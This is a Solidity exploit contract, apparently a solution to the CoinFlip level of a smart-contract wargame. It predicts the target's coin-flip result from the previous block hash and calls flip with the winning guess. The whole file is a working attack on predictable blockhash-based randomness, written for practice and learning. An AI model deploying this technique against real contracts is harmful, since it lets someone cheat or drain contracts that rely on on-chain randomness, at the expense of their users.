// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";
import "hardhat/console.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private lastHash;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external returns (bool){
    uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
          console.log("lastHash is the same; reverting!!!");
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        console.log("Coinflip value hacking: %s", side);
        return CoinFlip(contractAddress).flip(side);
    }
}
